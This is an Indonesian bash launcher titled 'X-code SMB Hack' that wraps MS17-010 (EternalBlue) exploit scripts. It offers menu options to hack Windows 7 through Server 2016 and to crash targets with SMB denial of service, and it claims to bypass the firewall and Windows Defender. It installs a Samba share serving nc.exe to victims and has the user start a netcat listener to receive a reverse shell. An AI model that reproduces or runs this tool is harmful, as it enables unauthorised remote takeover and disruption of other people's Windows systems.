#!/bin/bash
#Exploit memanfaatkan exploit yang dibuat https://github.com/worawit/MS17-010
again='y'
while [ $again == 'Y' ] || [ $again == 'y' ];
do
clear
echo "======================================================";
echo " X-code SMB hack for Kali Linux                       ";
echo " Hack windows XP/Vista/7/8.1/10/2012/2016             ";
echo " Bypass Firewall & bypass Windows Defender            ";
echo " Oleh Kurniawan                                       ";
echo " Kurniawanajazenfone@gmail.com                        ";
echo " xcode.or.id		                            ";
echo "------------------------------------------------------";
echo " 1. Status X-code SMB Hack                            ";
echo "------------------------------------------------------";
echo " 2. Install X-code SMB Hack for Kali Linux            ";
echo "------------------------------------------------------";
echo " Remote                                               ";
echo " 3. Edit Exploit untuk remote Windows 7 / 8.1 / 10    ";
echo " 4. Hack Windows 7 / 8.1 / 10                         ";
echo "------------------------------------------------------";
echo " Remote                                               ";
echo " 5. Edit Exploit untuk remote Windows 2012 / 2016     ";
echo " 6. Hack Windows Server 2012 / 2016                   ";
echo "------------------------------------------------------";
echo " 7. Uninstall X-code SMB Hack for Kali Linux 2.0      ";
echo "------------------------------------------------------";
echo " Denial of Service                                    ";
echo " 8. Denial of Service SMB Windows 7 / 8.1 / 10        ";
echo " 9. Denial of Service SMB Windows 2012 / 2016         ";
echo "------------------------------------------------------";
echo " 10. Exit                                             ";
echo "======================================================";

read -p "Masukkan Pilihan Anda antara 1 hingga 10: " choice;
echo "";
case $choice in

1)  if [ -z "$(sudo ls -A /home/xcode/nc.exe)" ]; then
    echo "X-code SMB Hack belum diinstall"
    else
    echo "X-code SMB Hack sudah diinstall"
    fi
    ;;

2)  if [ -z "$(sudo ls -A /home/xcode/nc.exe)" ]; then
    echo "Install X-code SMB Hack"
    echo "-----------------------"
    sudo apt-get install samba
    sudo useradd -m xcode
    sudo cp nc.exe /home/xcode/
    sudo mv /etc/samba/smb.conf /home/xcode
    sudo cp smb.conf /etc/samba/
    service smbd restart
    else
    echo "X-code SMB Hack sudah diinstall"
    fi
    ;;
 
3)  sudo nano hack1.py
    ;;

4)  echo "Pastikan dulu sebelum memasukkan ip target, sudah menjalankan nc -v -l -p 1500 di terminal lain dan mengedit exploit."  
    echo -n "Masukkan ip target: "
    read iptarget
    if [ -z "$(sudo ls -A /home/xcode/nc.exe)" ]; then
    echo "X-code SMB Hack belum diinstall, install dulu baru dijalankan"
    else
    echo "Hack Windows now!"
    sudo python mysmb.py
    sudo python hack1.py $iptarget
    fi
    ;;

5)  sudo nano hack2.py
    ;;

6)  echo "Pastikan dulu sebelum memasukkan ip target, sudah menjalankan nc -v -l -p 1500 di terminal lain dan mengedit exploit."    
    echo -n "Masukkan ip target: "
    read iptarget
    if [ -z "$(sudo ls -A /home/xcode/nc.exe)" ]; then
    echo "X-code SMB Hack belum diinstall, install dulu baru dijalankan"
    else
    echo "Hack Windows now!"
    sudo python mysmb.py
    sudo python hack2.py $iptarget    
    fi
    ;;

7)  if [ -z "$(sudo ls -A /home/xcode/nc.exe)" ]; then
    echo "X-code SMB Hack belum install, apa yang mau diuninstall?"
    else
    echo "X-code SMB Hack diuninstall"
    echo "---------------------------"
    sudo cp /home/xcode/smb.conf /etc/samba
    sudo userdel xcode
    sudo rm -r /home/xcode
    fi
    ;;

8)  echo "Denial of Service pada Windows 7,8.1,10)"  
    echo -n "Masukkan ip target: "
    read iptarget
    sudo python mysmb.py
    sudo python dos1.py $iptarget
    ;;

9)  echo "Denial of Service pada Windows Server 2012, 2016)"  
    echo -n "Masukkan ip target: "
    read iptarget
    sudo python mysmb.py
    sudo python dos1.py $iptarget    
    ;;

10)  exit
    ;;
*)    echo "Maaf, menu tidak ada"
esac
echo ""
echo "X-code SMB Hack v0.1"
echo "Oleh Kurniawan - trainingxcode@gmail.com. xcode.or.id"
echo ""
echo -n "Kembali ke menu? [y/n]: ";
read again;
while [ $again != 'Y' ] && [ $again != 'y' ] && [ $again != 'N' ] && [ $again != 'n' ];
do
echo "Masukkan yang anda pilih tidak ada di menu";
echo -n "Kembali ke menu? [y/n]: ";
read again;
done
done